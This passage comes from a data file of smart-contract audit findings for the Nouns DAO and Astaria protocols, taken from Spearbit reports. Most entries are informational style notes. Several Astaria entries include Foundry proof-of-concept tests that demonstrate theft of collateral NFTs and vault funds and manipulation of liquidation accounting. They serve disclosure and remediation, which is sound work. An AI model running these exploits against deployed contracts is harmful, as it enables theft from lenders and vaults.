        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Nouns-Spearbit-Security-Review.pdf",
        "body": "Some contracts have missing or unused events, as well as event parameters that are unindexed. As an examples: 1. Unused events: INounsTokenFork.sol#L29: event NoundersDAOUpdated(address noundersDAO); 2. Missing events: NounsDAOV3Admin.sol#L509-514: Missing event like in _setForkEscrow 3. Unindexed parameters: NounsDAOEventsFork.sol: Many parameters can be indexed here",
        "labels": [
            "Spearbit",
            "Nouns",
            "Severity: Informational"
        ]
    },
    {
        "title": "Prefer using __Ownable_init instead of _transferOwnership to initialize upgradable contracts",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Nouns-Spearbit-Security-Review.pdf",
        "body": "The upgradable NounsAuctionHouseFork and the NounsTokenFork contracts inherit the OwnableUp- gradeable contract. However, inside the initialize function the ownership transfer is performed by calling the internal _transferOwnership function instead of calling the __Ownable_init. This deviates from the standard ap- proach of initializing upgradable contracts, and it can lead to issues if the OwnableUpgradeable contract changes its initialization mechanism.",
        "labels": [
            "Spearbit",
            "Nouns",
            "Severity: Informational"
        ]
    },
    {
        "title": "Consider emitting the address of the timelock in the ProposalQueued event",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Nouns-Spearbit-Security-Review.pdf",
        "body": "The queue function currently emits the ProposalQueued event to provide relevant information about the proposal, including the proposalId and the eta. However, it doesn't emit the timelock variable, which rep- resents the address of the timelock responsible for executing the proposal. This could lead to confusion among users regarding the intended timelock for proposal execution.",
        "labels": [
            "Spearbit",
            "Nouns",
            "Severity: Informational"
        ]
    },
    {
        "title": "Use IERC20Upgradeable/IERC721Upgradeable for consistency with other contracts",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Nouns-Spearbit-Security-Review.pdf",
        "body": "Most contracts/libraries imported and used are the upgradeable variant e.g. OwnableUpgradeable. IERC20 and IERC721 are used which is inconsistent with the other contracts/libraries. Since the project is deployed with upgradeability featured, it is more preferable to use the Upgradeable variant of OpenZeppelin Contracts.",
        "labels": [
            "Spearbit",
            "Nouns",
            "Severity: Informational"
        ]
    },
    {
        "title": "Specification says \"Pending\" state instead of \"Updatable\"",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Nouns-Spearbit-Security-Review.pdf",
        "body": "The V3 spec says the following for \"Proposal editing\": \"The proposer account of a proposal in the PENDING state can call an updateProposal function, providing the new complete set of transactions to execute, as well as a complete new version of the proposal description text.\" This is incorrect because editing can only happen in the \"Updatable\" state which is just before the \"Pending\" state.",
        "labels": [
            "Spearbit",
            "Nouns",
            "Severity: Informational"
        ]
    },
    {
        "title": "Typos, comments and descriptions need to be updated",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Nouns-Spearbit-Security-Review.pdf",
        "body": "comments/descriptions. The contract Typos: source code contains several typographical errors and misaligned 1. NounsDAOLogicV1Fork.sol#L48: adjutedTotalSupply should be adjustedTotalSupply 2. NounsDAOLogicV1Fork.sol#L80: veteor shoud be vetoer 3. NounsDAOV3Votes.sol#L267: objetion should be objection 4. NounsDAOExecutorProxy.sol#L24: imlemenation should be implementation Comment Discrepancies: 1. NounsDAOV3Admin.sol#L130: Should say // 6,000 basis points or 60% and not 4,000 2. NounsDAOV3Votes.sol#L219: change string 'NounsDAO::castVoteInternal: voter already voted' to 'NounsDAO::castVoteDuringVotingPeriodInternal: voter already voted' 54 3. NounsDAOExecutorV2.sol#L209: change string 'NounsDAOExecutor::executeTransaction: Call must come from admin. to 'NounsDAOExecutor::sendETH: Call must come from admin. 4. NounsDAOExecutorV2.sol#L221: change string NounsDAOExecutor::executeTransaction: Call must come from admin. to NounsDAOExecutor::sendERC20: Call must come from admin. 5. NounsDAOV3DynamicQuorum.sol#L124: Should be adjusted total supply 6. NounsDAOV3DynamicQuorum.sol#L135: Should be adjusted total supply 7. NounsDAOLogicV3.sol#L902: Adjusted supply is used for minQuorumVotes() 8. NounsDAOLogicV3.sol#L909: Adjusted supply is used for maxQuorumVotes() 9. NounsDAOStorageV1Fork.sol#L33: proposalThresholdBPS is required to be exceeded, say when it is zero, one noun is needed to propose 10. NounsTokenFork.sol#L66: Typo, to be after which",
        "labels": [
            "Spearbit",
            "Nouns",
            "Severity: Informational"
        ]
    },
    {
        "title": "Contracts are not using the _disableInitializers function",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Nouns-Spearbit-Security-Review.pdf",
        "body": "Several Nouns-Dao contracts utilize the Initializable module provided by OpenZeppelin. To ensure that an implementation contract is not left uninitialized, it is recommended in OpenZeppelin's documentation to include the _disableInitializers function in the constructor. The _disableInitializers function automatically locks the contracts upon deployment. According to the OpenZeppelin documentation: Do not leave an implementation contract uninitialized. An uninitialized implementation contract can be taken over by an attacker, which may impact the proxy. To prevent the implementation contract from being used, you should invoke the _disableInitializers function in the constructor to automatically lock it when it is deployed:",
        "labels": [
            "Spearbit",
            "Nouns",
            "Severity: Informational"
        ]
    },
    {
        "title": "Missing or incomplete Natspec documentation",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Nouns-Spearbit-Security-Review.pdf",
        "body": "There are several instances throughout the codebase where NatSpec is either missing or incomplete. 1. Missing Natspec (Some functions in this case are missing Natspec comment):  NounsDAOV3Fork.sol#L203  NounsDAOV3Votes.sol#L295  NounsDAOV3Admin.sol  NounsDAOV3Proposals.sol  NounsDAOExecutor.sol  NounsDAOExecutorV2.sol 2. Incomplete Natspec (Some functions are missing @param tag):  NounsTokenFork.sol  NounsDAOV3Admin.sol  NounsDAOV3Proposals.sol  NounsDAOLogicV3.sol",
        "labels": [
            "Spearbit",
            "Nouns",
            "Severity: Informational"
        ]
    },
    {
        "title": "Function ordering does not follow the Solidity style guide",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Nouns-Spearbit-Security-Review.pdf",
        "body": "The recommended order of functions in Solidity, as outlined in the Solidity style guide, is as follows: constructor(), receive(), fallback(), external, public, internal and private. However, this ordering isn't enforced in the across the Nouns-Dao codebase.",
        "labels": [
            "Spearbit",
            "Nouns",
            "Severity: Informational"
        ]
    },
    {
        "title": "Use a more recent Solidity version",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Nouns-Spearbit-Security-Review.pdf",
        "body": "The compiler version used 0.8.6 is quite old (current version is 0.8.20). This version was released almost two years ago and there have been five applicable bug fixes to this version since then. While it seems that those bugs don't apply to the Nouns-Dao codebase, it is advised to update the compiler to a newer version.",
        "labels": [
            "Spearbit",
            "Nouns",
            "Severity: Informational ERC721CheckpointableUpgradeable.sol#L46, NounsDAOExecutorV2.sol#L40, NounsDAOLog-"
        ]
    },
    {
        "title": "State modifications after external sToOwner prone to reentrancy attacks",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Nouns-Spearbit-Security-Review.pdf",
        "body": "External NFT call happens before numTokensInEscrow update in returnTokensToOwner(). This looks safe (NFT is fixed to be noun contract and transferFrom() is used instead of the safe version, and also numTokensInEscrow = 0 in closeEscrow() acts as a control for numTokensInEscrow -= tokenIds.length logic), but in general this type of execution flow structuring could allow for direct stealing via reentrancy. I.e. in a presence of callback (e.g. arbitrary NFT instead of noun contract or safeTransferFrom instead of trans- ferFrom) and without numTokensInEscrow = 0 conflicting with numTokensInEscrow -= tokenIds.length, as an abstract example, an attacker would add the last needed noun for forking, then call withdrawFromForkEscrow() and then, being in returnTokensToOwner(), call executeFork() from the callback hook, successfully performing the fork, while already withdrawn the NFT that belongs to DAO.  NounsDAOForkEscrow.sol#L110-L125) function returnTokensToOwner(address owner, uint256[] calldata tokenIds) external onlyDAO { for (uint256 i = 0; i < tokenIds.length; i++) { if (currentOwnerOf(tokenIds[i]) != owner) revert NotOwner(); >> nounsToken.transferFrom(address(this), owner, tokenIds[i]); escrowedTokensByForkId[forkId][tokenIds[i]] = address(0); } numTokensInEscrow -= tokenIds.length; }  NounsDAOV3Fork.sol#L109-L130 57 function executeFork(NounsDAOStorageV3.StorageV3 storage ds) external returns (address forkTreasury, address forkToken) { if (isForkPeriodActive(ds)) revert ForkPeriodActive(); INounsDAOForkEscrow forkEscrow = ds.forkEscrow; >> uint256 tokensInEscrow = forkEscrow.numTokensInEscrow(); if (tokensInEscrow <= forkThreshold(ds)) revert ForkThresholdNotMet(); uint256 forkEndTimestamp = block.timestamp + ds.forkPeriod; (forkTreasury, forkToken) = ds.forkDAODeployer.deployForkDAO(forkEndTimestamp, forkEscrow); sendProRataTreasury(ds, forkTreasury, tokensInEscrow, adjustedTotalSupply(ds)); uint32 forkId = forkEscrow.closeEscrow(); ds.forkDAOTreasury = forkTreasury; ds.forkDAOToken = forkToken; ds.forkEndTimestamp = forkEndTimestamp; emit ExecuteFork(forkId, forkTreasury, forkToken, forkEndTimestamp, tokensInEscrow); } Direct stealing as a result of state manipulations is possible conditional on an ability to enter a callback. Given the absense of the latter at the moment, but critical impact of the former, considering this as best practice recommen- dation and setting the severity to be informational.",
        "labels": [
            "Spearbit",
            "Nouns",
            "Severity: Informational interactions make NounsDAOForkEscrow's returnToken-"
        ]
    },
    {
        "title": "No need to use an assembly block to get the chain ID",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Nouns-Spearbit-Security-Review.pdf",
        "body": "Currently the getChainId() uses an assembly block to get the current chain ID when constructing the domain separator. This is not needed since there is a global variable for this already.",
        "labels": [
            "Spearbit",
            "Nouns",
            "Severity: Informational"
        ]
    },
    {
        "title": "Naming convention for interfaces is not always always followed",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Nouns-Spearbit-Security-Review.pdf",
        "body": "The NounsTokenForkLike interface does not follow the standard naming convention for Solidity interfaces, which begins with an I prefix. This inconsistency can make it harder for developers to understand the purpose and usage of the contract.",
        "labels": [
            "Spearbit",
            "Nouns",
            "Severity: Informational"
        ]
    },
    {
        "title": "The extra data (encoded stack) provided to advanced orders to Seaport are not validated properly by the CollateralToken upon callback",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review-July.pdf",
        "body": "The extra data (encoded stack) provided to advanced orders to Seaport are not validated properly by the CollateralToken upon callback when validateOrder(...) order is called by Seaport. When a stack/lien gets liquidated an auction is created on Seaport with the offerer and zone set as the Col- lateralToken and the order type is full restricted so that the aforementioned call back is performed at the end of fulfilment/matching orders on Seaport. An extra piece of information which needs to be provided by the fulfiller or matcher on Seaport is the extra data which is the encoded stack. The only validation that happens during the call back is the following to make sure that the 1st consideration's token matches with the decoded stack's lien's token: ERC20 paymentToken = ERC20(zoneParameters.consideration[0].token); if (address(paymentToken) != stack.lien.token) { revert InvalidPaymentToken(); } Besides that one does not check that this stack corresponds to the same collateralId with the same lien id. So a bidder on Seaport can take advantage of this and provide a spoofed extra data as follows: 1. The borrower collateralises its NFT token and takes a lien from a public vault 2. The lien expires and a liquidator calls liquidate(...) for the corresponding stack. 3. The bidder creates a private vault and deposits 1 wei worth of WETH into it. 4. The bidder collateralises a fake NFT token and takes a lien with 1 wei worth of WETH as a loan 5. The bidder provides the encoded fake stack from the step 4 as an extra data to settle the auction for the real liquidated lien from step 2 on Seaport. The net result from these steps are that  The original NFT token will be owned by the bidder.  The change in the sum of the ETH and WETH balances of the borrower, liquidator and the bidder would be the original borrowed amount from step 1. (might be off by a few wei due to division errors when calculating the liquidator fees).  The original public vault would not receive its loan amount from the borrower or the auction amount the Seaport liquidation auction. If the borrower, the liquidator and the bidder were the same, this entity would end up with its original NFT token plus the loaned amount from the original public vault. If the liquidator and the bidder were the same, the bidder would end up with the original NFT token and might have to pay around 1 wei due to division errors. The borrower gets to keep its loan. The public vault would not receive the loan or any portion of the amount settled in the liquidation auction. The following diff in the test contracts is needed for the PoC to work: 5 diff --git a/src/test/TestHelpers.t.sol b/src/test/TestHelpers.t.sol index fab5fbd..5c9bfc8 100644 --- a/src/test/TestHelpers.t.sol +++ b/src/test/TestHelpers.t.sol @@ -163,7 +163,6 @@ contract ConsiderationTester is BaseSeaportTest, AmountDeriver { vm.label(address(this), \"testContract\"); } } - contract TestHelpers is Deploy, ConsiderationTester { using CollateralLookup for address; using Strings2 for bytes; @@ -1608,7 +1607,7 @@ contract TestHelpers is Deploy, ConsiderationTester { orders, new CriteriaResolver[](0), fulfillments, address(this) incomingBidder.bidder - + ); } else { consideration.fulfillAdvancedOrder( @@ -1621,7 +1620,7 @@ contract TestHelpers is Deploy, ConsiderationTester { ), new CriteriaResolver[](0), bidderConduits[incomingBidder.bidder].conduitKey, address(this) incomingBidder.bidder - + ); } delete fulfillments; The PoC: forge t --mt testScenario9 --ffi -vvv // add the following test case to // file: src/test/LienTokenSettlementScenarioTest.t.sol // Scenario 8: commitToLien -> liquidate -> settle Seaport auction with mismtaching stack as an ,! extraData function testScenario9() public { TestNFT nft = new TestNFT(1); address tokenContract = address(nft); uint256 tokenId = uint256(0); vm.label(address(this), \"borrowerContract\"); { // create a PublicVault with a 14-day epoch address publicVault = _createPublicVault( strategistOne, strategistTwo, 14 days, 1e17 ); vm.label(publicVault, \"Public Vault\"); // lend 10 ether to the PublicVault as address(1) _lendToVault( Lender({addr: address(1), amountToLend: 10 ether}), payable(publicVault) 6 ); WETH9.balanceOf(publicVault)); emit log_named_uint(\"Public vault WETH balance before commiting to a lien\", ,! emit log_named_uint(\"borrower ETH balance before commiting to a lien\", address(this).balance); emit log_named_uint(\"borrower WETH balance before commiting to a lien\", ,! WETH9.balanceOf(address(this))); // borrow 10 eth against the dummy NFT with tokenId 0 (, ILienToken.Stack memory stack) = _commitToLien({ vault: payable(publicVault), strategist: strategistOne, strategistPK: strategistOnePK, tokenContract: tokenContract, tokenId: tokenId, lienDetails: ILienToken.Details({ maxAmount: 50 ether, rate: (uint256(1e16) * 150) / (365 days), duration: 10 days, maxPotentialDebt: 0 ether, liquidationInitialAsk: 100 ether }), amount: 10 ether }); assertEq( nft.ownerOf(tokenId), address(COLLATERAL_TOKEN), \"The bidder did not receive the collateral token after the auction end.\" ); WETH9.balanceOf(publicVault)); emit log_named_uint(\"Public vault WETH balance after commiting to a lien\", ,! emit log_named_address(\"NFT token owner\", nft.ownerOf(tokenId)); emit log_named_uint(\"borrower ETH balance after commiting to a lien\", address(this).balance); emit log_named_uint(\"borrower WETH balance after commiting to a lien\", ,! WETH9.balanceOf(address(this))); uint256 collateralId = tokenContract.computeId(tokenId); // verify the strategist has no shares minted assertEq( PublicVault(payable(publicVault)).balanceOf(strategistOne), 0, \"Strategist has incorrect share balance\" ); // verify that the borrower has the CollateralTokens assertEq( COLLATERAL_TOKEN.ownerOf(collateralId), address(this), \"CollateralToken not minted to borrower\" ); // fast forward to the end of the lien one vm.warp(block.timestamp + 10 days); address liquidatorOne = vm.addr(0x1195da7051); vm.label(liquidatorOne, \"liquidator 1\"); // liquidate the lien vm.startPrank(liquidatorOne); 7 emit log_named_uint(\"liquidator WETH balance before liquidation\", WETH9.balanceOf(liquidatorOne)); OrderParameters memory listedOrder = _liquidate(stack); vm.stopPrank(); assertEq( LIEN_TOKEN.getAuctionLiquidator(collateralId), liquidatorOne, \"liquidator is not stored in s.collateralLiquidator[collateralId]\" ); // --- start of the attack --- vm.label(bidder, \"bidder\"); vm.startPrank(bidder); TestNFT fakeNFT = new TestNFT(1); address fakeTokenContract = address(fakeNFT); uint256 fakeTokenId = uint256(0); vm.stopPrank(); address privateVault = _createPrivateVault( bidder, bidder ); vm.label(privateVault, \"Fake Private Vault\"); _lendToPrivateVault( PrivateLender({ addr: bidder, amountToLend: 1 wei, token: address(WETH9) }), payable(privateVault) ); vm.startPrank(bidder); // it is important that the fakeStack.lien.token is the same as the original stack's token // below deals 1 wei to the bidder which is also the fakeStack borrower (, ILienToken.Stack memory fakeStack) = _commitToLien({ vault: payable(privateVault), strategist: bidder, strategistPK: bidderPK, tokenContract: fakeTokenContract, tokenId: fakeTokenId, lienDetails: ILienToken.Details({ maxAmount: 1 wei, rate: 1, // needs to be non-zero duration: 1 hours, // s.minLoanDuration maxPotentialDebt: 0 ether, liquidationInitialAsk: 1 wei }), amount: 1 wei }); emit log_named_uint(\"CollateralToken WETH balance before auction end\", ,! WETH9.balanceOf(address(COLLATERAL_TOKEN))); // _bid deals 300 ether to the bidder _bid( Bidder({bidder: bidder, bidderPK: bidderPK}), listedOrder, // order paramters created for the original stack during the liquidation 100 ether, // stack.lien.details.liquidationInitialAsk 8 fakeStack ); emit log_named_uint(\"Public vault WETH balance after auction end\", WETH9.balanceOf(publicVault)); emit log_named_uint(\"borrower WETH balance after auction end\", WETH9.balanceOf(address(this))); emit log_named_uint(\"liquidator WETH balance after auction end\", WETH9.balanceOf(liquidatorOne)); emit log_named_uint(\"bidder WETH balance after auction end\", WETH9.balanceOf(bidder)); emit log_named_uint(\"bidder ETH balance before commiting to a lien\", address(bidder).balance); emit log_named_uint(\"CollateralToken WETH balance after auction end\", ,! emit log_named_address(\"bidder\", bidder); emit log_named_address(\"owner of the original collateral after auction end\", ,! WETH9.balanceOf(address(COLLATERAL_TOKEN))); nft.ownerOf(tokenId)); // _removeLien is not called for collateralId assertEq( LIEN_TOKEN.getAuctionLiquidator(collateralId), liquidatorOne, \"_removeLien is called for collateralId\" ); // WETH balance of the public vault is still 0 even after the auction assertEq( WETH9.balanceOf(publicVault), 0 ); } assertEq( nft.ownerOf(tokenId), bidder, \"The bidder did not receive the collateral token after the auction end.\" ); }",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Critical Risk"
        ]
    },
    {
        "title": "AstariaRouter.liquidate(...) can be called multiple times for an expired lien/stack",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review-July.pdf",
        "body": "The current implementation of the protocol does not have any safeguard around calling Astari- aRouter.liquidate(...) only once for an expired stack/lien. Thus, when a lien expires, multiple adversaries can override many different parameters by calling this endpoint at will in the same block or different blocks till one of the created auctions settles (which might not as one can keep stacking these auctions with some delays to have a never-ending liquidation flow). Here is the list of storage parameters that can be manipulated:  s.collateralLiquidator[stack.lien.collateralId].amountOwed in LienToken: it is possible to keep in- creasing this value if we stack calls to the liquidate(...) with delays.  s.collateralLiquidator[stack.lien.collateralId].liquidator in LienToken: This can be overwritten and would hold the last liquidator's address and so only this liquidator can claim the NFT if the auction its corresponding auction does not settle and also it would receive the liquidation fees.  s.idToUnderlying[params.collateralId].auctionHash in CollateralToken: would hold the last created auction's order hash for the same expired lien backed by the same collateral.  slope in PublicVault: If the lien is taken from a public vault, each call to liquidate(...) would reduce this value. So we can make this slope really small.  s.epochData[epoch].liensOpenForEpoch in PublicVault: If the lien is taken from a public vault, each call to liquidate(...) would reduce this value. So we can make this slope really small or even 0 depends on the rate of this lien and the slope of the vault due to arithmetic underflows.  yIntercept in PublicVault: Mixing the manipulation of the vault's slope and stacking the calls to liqui- date(...) with delays we can also manipulate yIntercept. // add the following test case to: // file: src/test/LienTokenSettlementScenarioTest.t.sol function testScenario8() public { TestNFT nft = new TestNFT(2); address tokenContract = address(nft); uint256 tokenIdOne = uint256(0); uint256 tokenIdTwo = uint256(1); uint256 initialBalance = WETH9.balanceOf(address(this)); // create a PublicVault with a 14-day epoch address publicVault = _createPublicVault( strategistOne, strategistTwo, 14 days, 1e17 ); // lend 20 ether to the PublicVault as address(1) _lendToVault( Lender({addr: address(1), amountToLend: 20 ether}), payable(publicVault) ); uint256 vaultShares = PublicVault(payable(publicVault)).totalSupply(); // borrow 10 eth against the dummy NFT with tokenId 0 (, ILienToken.Stack memory stackOne) = _commitToLien({ vault: payable(publicVault), strategist: strategistOne, strategistPK: strategistOnePK, tokenContract: tokenContract, tokenId: tokenIdOne, lienDetails: ILienToken.Details({ 10 maxAmount: 50 ether, rate: (uint256(1e16) * 150) / (365 days), duration: 10 days, maxPotentialDebt: 0 ether, liquidationInitialAsk: 100 ether }), amount: 10 ether }); // borrow 10 eth against the dummy NFT with tokenId 1 (, ILienToken.Stack memory stackTwo) = _commitToLien({ vault: payable(publicVault), strategist: strategistOne, strategistPK: strategistOnePK, tokenContract: tokenContract, tokenId: tokenIdTwo, lienDetails: ILienToken.Details({ maxAmount: 50 ether, rate: (uint256(1e16) * 150) / (365 days), duration: 10 days, maxPotentialDebt: 0 ether, liquidationInitialAsk: 100 ether }), amount: 10 ether }); uint256 collateralIdOne = tokenContract.computeId(tokenIdOne); uint256 collateralIdTwo = tokenContract.computeId(tokenIdTwo); // verify the strategist has no shares minted assertEq( PublicVault(payable(publicVault)).balanceOf(strategistOne), 0, \"Strategist has incorrect share balance\" ); // verify that the borrower has the CollateralTokens assertEq( COLLATERAL_TOKEN.ownerOf(collateralIdOne), address(this), \"CollateralToken not minted to borrower\" ); assertEq( COLLATERAL_TOKEN.ownerOf(collateralIdTwo), address(this), \"CollateralToken not minted to borrower\" ); // fast forward to the end of the lien one vm.warp(block.timestamp + 10 days); address liquidatorOne = vm.addr(0x1195da7051); address liquidatorTwo = vm.addr(0x1195da7052); vm.label(liquidatorOne, \"liquidator 1\"); vm.label(liquidatorTwo, \"liquidator 2\"); // liquidate the first lien vm.startPrank(liquidatorOne); OrderParameters memory listedOrder = _liquidate(stackOne); vm.stopPrank(); 11 assertEq( LIEN_TOKEN.getAuctionLiquidator(collateralIdOne), liquidatorOne, \"liquidator is not stored in s.collateralLiquidator[collateralId]\" ); // // liquidate the first lien with a different liquidator vm.startPrank(liquidatorTwo); listedOrder = _liquidate(stackOne); vm.stopPrank(); assertEq( LIEN_TOKEN.getAuctionLiquidator(collateralIdOne), liquidatorTwo, \"liquidator is not stored in s.collateralLiquidator[collateralId]\" ); // validate the slope is updated twice for the same expired lien // and so the accounting for the public vault is manipulated assertEq( PublicVault(payable(publicVault)).getSlope(), 0, \"PublicVault slope divergent\" ); // publicVault.storageSlot.epochData[epoch].liensOpenForEpoch is also dfecremented twice // CollateralToken.storageSlot.idToUnderlying[params.collateralId].auctionHash can also be ,! manipulated }",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Critical Risk"
        ]
    },
    {
        "title": "maxStrategistFee is incorrectly set in AstariaRouter's constructor",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review-July.pdf",
        "body": "In AstariaRouter's constructor we set the maxStrategistFee as s.maxStrategistFee = uint256(50e17); // 5e18 But in the filing route we check that this value should not be greater than 1e18. 12 maxStrategistFee is supposed to set an upper bound for public vaults's strategist vault fee. When a payment is made for a lien, one calculates the shares to be minted for the strategist based on this value and the interest amount paid: function _handleStrategistInterestReward( VaultData storage s, uint256 interestPaid ) internal virtual { if (VAULT_FEE() != uint256(0) && interestPaid > 0) { uint256 fee = interestPaid.mulWadDown(VAULT_FEE()); uint256 feeInShares = convertToShares(fee); _mint(owner(), feeInShares); } } Note that we are using mulWadDown(...) here: F = j I (cid:1) f 1018k parameter description F f I fee VAULT_FEE() interestPaid so we would want f (cid:20) 1018. Currently, a vault could charge 5 times the interest paid.",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: High Risk"
        ]
    },
    {
        "title": "When a vault is shutdown a user can still commit to liens using the vault",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review-July.pdf",
        "body": "When a vault is shutdown, one should not be able to take more liens using the funds from this vault. In the commit to lien flow, AstariaRouter fetches the state of the vault 13 ( , address delegate, address owner, , , // s.isShutdown uint256 nonce, bytes32 domainSeparator ) = IVaultImplementation(c.lienRequest.strategy.vault).getState(); But does not use the s.isShutdown flag to stop the flow if it is set to true. When a vault is shutdown we should have: vault endpoint reverts should revert deposit mint redeem withdraw redeemFutureEpoch payment flows liquidation flows commitToLien YES YES NO NO NO NO NO YES // add this test case to // file: src/test/LienTokenSettlementScenarioTest.t.sol // Scenario 12: create vault > shutdown > commitToLien function testScenario12() public { { console2.log(\"--- test private vault shutdown ---\"); uint256 ownerPK = uint256(0xa77ac3); address owner = vm.addr(ownerPK); vm.label(owner, \"owner\"); uint256 lienId; TestNFT nft = new TestNFT(1); address tokenContract = address(nft); uint256 tokenId = uint256(0); address privateVault = _createPrivateVault(owner, owner); vm.label(privateVault, \"privateVault\"); console2.log(\"[+] private vault is created: %s\", privateVault); // lend 1 wei to the privateVault _lendToPrivateVault( PrivateLender({addr: owner, amountToLend: 1 wei, token: address(WETH9)}), payable(privateVault) ); console2.log(\"[+] lent 1 wei to the private vault.\"); console2.log(\"[+] shudown private vault.\"); 14 vm.startPrank(owner); Vault(payable(privateVault)).shutdown(); vm.stopPrank(); assertEq( Vault(payable(privateVault)).getShutdown(), true, \"Private Vault should be shutdown.\" ); // borrow 1 wei against the dummy NFT (lienId, ) = _commitToLien({ vault: payable(privateVault), strategist: owner, strategistPK: ownerPK, tokenContract: tokenContract, tokenId: tokenId, lienDetails: ILienToken.Details({ maxAmount: 1 wei, rate: 1, duration: 1 hours, maxPotentialDebt: 0 ether, liquidationInitialAsk: 1 ether }), amount: 1 wei, revertMessage: \"\" }); console2.log(\"[+] borrowed 1 wei against the private vault.\"); lienId: %s\", lienId); console2.log(\" owner of lienId: %s\\n\\n\", LIEN_TOKEN.ownerOf(lienId)); console2.log(\" assertEq( LIEN_TOKEN.ownerOf(lienId), owner, \"owner should be the owner of the lienId.\" ); } { console2.log(\"--- test public vault shutdown ---\"); uint256 ownerPK = uint256(0xa77ac322); address owner = vm.addr(ownerPK); vm.label(owner, \"owner\"); uint256 lienId; TestNFT nft = new TestNFT(1); address tokenContract = address(nft); uint256 tokenId = uint256(0); address publicVault = _createPublicVault(owner, owner, 14 days); vm.label(publicVault, \"publicVault\"); console2.log(\"[+] public vault is created: %s\", publicVault); // lend 1 wei to the publicVault _lendToVault( Lender({addr: owner, amountToLend: 1 ether}), payable(publicVault) ); 15 console2.log(\"[+] lent 1 ether to the public vault.\"); console2.log(\"[+] shudown public vault.\"); vm.startPrank(owner); Vault(payable(publicVault)).shutdown(); vm.stopPrank(); assertEq( Vault(payable(publicVault)).getShutdown(), true, \"Public Vault should be shutdown.\" ); // borrow 1 wei against the dummy NFT (lienId, ) = _commitToLien({ vault: payable(publicVault), strategist: owner, strategistPK: ownerPK, tokenContract: tokenContract, tokenId: tokenId, lienDetails: ILienToken.Details({ maxAmount: 1 wei, rate: 1, duration: 1 hours, maxPotentialDebt: 0 ether, liquidationInitialAsk: 1 ether }), amount: 1 wei, revertMessage: \"\" }); console2.log(\"[+] borrowed 1 wei against the public vault.\"); console2.log(\" console2.log(\" lienId: %s\", lienId); owner of lienId: %s\", LIEN_TOKEN.ownerOf(lienId)); assertEq( LIEN_TOKEN.ownerOf(lienId), publicVault, \"Public vault should be the owner of the lienId.\" ); } } forge t --mt testScenario12 --ffi -vvv: 16 --- test private vault shutdown --- [+] private vault is created: 0x7BF14E2ad40df80677D356099565a08011B72d66 [+] lent 1 wei to the private vault. [+] shudown private vault. [+] borrowed 1 wei against the private vault. lienId: 78113226609386929237635937490344951966356214732432064308195118046023211325984 owner of lienId: 0x60873Bc6F2C9333b465F60e461cf548EfFc7E6EA --- test public vault shutdown --- [+] public vault is created: 0x5b1A54d097AA8Ce673b6816577752F6dfc10Ddd6 [+] lent 1 ether to the public vault. [+] shudown public vault. [+] borrowed 1 wei against the public vault. lienId: 13217102800774263219074199159187108198090219420208960450275388834853683629020 owner of lienId: 0x5b1A54d097AA8Ce673b6816577752F6dfc10Ddd6",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: High Risk"
        ]
    },
    {
        "title": "transfer(...) function in _issuePayout(...) can be replaced by a direct call",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review-July.pdf",
        "body": "In the _issuePayout(...) internal function of the VaultImplementation if the asset is WETH the amount is withdrawn from WETH to native tokens and then transfered to the borrower: if (asset() == WETH()) { IWETH9 wethContract = IWETH9(asset()); wethContract.withdraw(newAmount); payable(borrower).transfer(newAmount); } transfer limits the amount of gas shared to the call to the borrower which would prevent executing a complex callback and due to changes in gas prices in EVM it might even break some feature for a potential borrower contract. For the analysis of the flow for both types of vaults please refer to the following issue:  'Storage parameters are updated after a few callback sites to external addresses in the commitToLien(...) flow'",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "Storage parameters are updated after a few callback sites to external addresses in the commit- ToLien(...) flow",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review-July.pdf",
        "body": "In the commitToLien(...) flow the following storage parameters are updated after some of the external call back sites when payout is issued or a lien is transferred from a private vault to its owner: 26  collateralStateHash in LienToken: One can potentially re-enter to take another lien using the same col- lateral, but this is not possible since the collateral NFT token is already transferred to the CollateralToken (unless one is dealing with some esoteric NFT token). The createLien(...) requires this parameter to be 0., and that's why a potential re-entrancy can bypass this requirement. | Read re-entrancy: Yes  slope in PublicVault: - | Read re-entrancy: Yes  liensOpenForEpoch in PublicVault: If flash liens are allowed one can re-enter and process the epoch before finishing the commitToLien(...). And so the processed epoch would have open liens even though we would want to make sure this could not happen | Read re-entrancy: Yes The re-entrancies can happen if the vault asset performs a call back to the receiver when transferring tokens (during issuance of payouts). And if one is dealing with WETH, the native token amount is transfer(...) to the borrower. Note in the case of Native tokens if the following recommendation from the below issue is considered the current issue could be of higher risk:  'transfer(...) function in _issuePayout(...) can be replaced by a direct call'",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "UNI_V3Validator fetches spot prices that may lead to price manipulation attacks",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review-July.pdf",
